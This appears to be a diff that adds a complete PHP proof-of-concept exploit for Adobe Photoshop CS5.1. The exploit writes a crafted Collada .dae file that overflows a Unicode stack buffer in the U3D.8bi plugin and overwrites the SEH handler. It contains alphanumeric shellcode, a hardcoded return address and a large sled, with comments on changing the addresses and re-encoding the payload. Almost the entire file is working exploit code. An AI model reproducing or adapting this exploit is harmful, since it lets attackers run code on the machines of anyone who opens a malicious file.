@@ -1,0 +1,108 @@
+<?php
+// ~ Adobe Photoshop CS5.1 U3D.8bi Library Collada Asset Elements 
+// Unicode Conversion Stack Based Buffer Overflow poc (*.dae)
+// (32bit/SEH) ~
+//
+// unicode overflow occurs when overlong asset elements are processed
+// one could be able to return inside an ASCII memory region
+// with an ultra large nop through assigning eip to ex. Photoshop.00630041.
+// the shellcode should be alphabetic (high bytes order filtering and various issues)
+// 
+// Usage: php 9sg_dae.php 
+// a file photoshop_sample.dae is created
+// start Photoshop then open it through the File menu
+// a message box pops, HEY!
+//
+// ~ rgod ~ - Advisory Reference: http://retrogod.altervista.org/9sg_photoshock_adv.htm
+
+/*
+you shuld change addresses according to your system
+then reencode with alpha2 (use eax alignment)
+
+//say "Hey" MsgBox Shellcode
+$code ="\x31\xc0\x31\xdb\x31\xc9\x31\xd2".
+       "\xeb\x2a\x59".
+       "\xbb\xca\x1d\xe4\x77". //LoadLibraryA(), kernel32.dll
+       "\x51\xff\xd3\xeb\x2f\x59\x51\x50".
+       "\xbb\x7a\x3d\xe6\x77". //GetProcAddress(), kernel32.dll
+       "\xff\xd3\xeb".
+       "\x34\x59\x31\xd2\x52\x51\x51\x52".
+       "\xff\xd0\x31\xd2\x50".
+       "\xb8\xf9\x68\xe6\x77". //ExitProcess(), kernel32.dll
+       "\xff\xd0\xe8\xd1\xff\xff".
+       "\xff\x75\x73\x65\x72\x33\x32\x2e".
+       "\x64\x6c\x6c\x00\xe8\xcc\xff\xff".
+       "\xff\x4d\x65\x73\x73\x61\x67\x65".
+       "\x42\x6f\x78\x41\x00\xe8\xc7\xff".
+       "\xff\xff\x48\x65\x79\x00";
+*/
+
+
+$scode = "\x2d\x7d\x25\x5b\x7f". //sub preamble, align eax for alpha code,clean
+         "\x2d\x79\x22\x20\x6f". //sub, align ... the gap is repaired through the inc eax trick
+         "PYIIIIIIIIIIIIIIII7QZjA".
+         "XP0A0AkAAQ2AB2BB0BBABXP".
+         "8ABuJIvQYPp1IKp1YYtqJrZ".
+         "K4jpYmk8JuMM4PwpQKOyCZK".
+         "vORycaRpMksJUmkVqgyoKcz".
+         "KvTRyTqZrRr0QrqPRkOn0VQ".
+         "N20PnXzY0hZFpwYojpM8N1k".
+         "OIokOQebSauPrP3trDnPdrL".
+         "PlUPKXxLKOKOIorm1u2SRS3".
+         "QQw0esrbOd8raC0KXKwkOYo".
+         "KO3xSUt9uPA";
+$eip="Ac"; //Photosho.00630041, return to our payload
+$payload = str_repeat("\x40",4096000);//inc eax, needed , also nop equivalent, don't touch
+$payload.=$scode;
+$payload.= str_repeat("\x40",1024000);
+
+$_xml ='<?xml version="1.0"?>'.
+       '<COLLADA xmlns="http://www.collada.org/2005/11/COLLADASchema" version="1.4.1">'.
+       '    <asset>'.
+       '    <contributor>'.
+       '    <author>rgod</author>'.
+       '    <authoring_tool>Maya 8.0 | ColladaMaya v3.02 | FCollada v3.2</authoring_tool>'.
+       '    <comments>Collada Maya Export Options: bakeTransforms=0;exportPolygonMeshes=1;bakeLighting=0;isSampling=0;'.
+       '      curveConstrainSampling=0;exportCameraAsLookat=0;'.
+       '      exportLights=1;exportCameras=1;exportJointsAndSkin=1;'.
+       '      exportAnimations=1;exportTriangles=1;exportInvisibleNodes=0;'.
+       '      exportNormals=1;exportTexCoords=1;exportVertexColors=1;exportTangents=0;'.
+       '      exportTexTangents=0;exportConstraints=1;exportPhysics=0;exportXRefs=1;'.
+       '      dereferenceXRefs=0;cameraXFov=0;'.
+       str_repeat("A",170).
+       'cameraYFov=1;'.
+       str_repeat("a",100).
+       str_repeat("b",100).
+       str_repeat("c",100).
+       str_repeat("d",100).
+       str_repeat("e",100).
+       str_repeat("f",100).
+       str_repeat("g",100).
+       str_repeat("h",100).
+       str_repeat("i",100).
+       str_repeat("j",100).
+       str_repeat("k",100).
+       str_repeat("l",100).
+       str_repeat("m",100).
+        str_repeat("n",100).
+"aaaabbbA".
+$eip.
+"ccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyy". 
+       '    </comments>'.
+       '<aaaa>'.
+       $payload.
+       '</aaaa>'.
+       '    <copyright>'.
+       '      Copyright 2012 rgod Computer Entertainment Inc.'.
+       '    </copyright>'.
+       '    <source_data>file:///C:/vs2005/sample_data/untitled</source_data>'.
+       '    </contributor>'.
+       '    <created>2008-04-24T22:29:59Z</created>'.
+       '    <modified>2099-02-21T22:52:44Z</modified>'.
+       '    <unit meter="0.01" name="centimeter"/>'.
+       '    <up_axis>Y_UP</up_axis>'.
+       '  </asset>'.
+       '</COLLADA>';
+file_put_contents("photoshop_sample.dae",$_xml);
+echo "done";
+?>
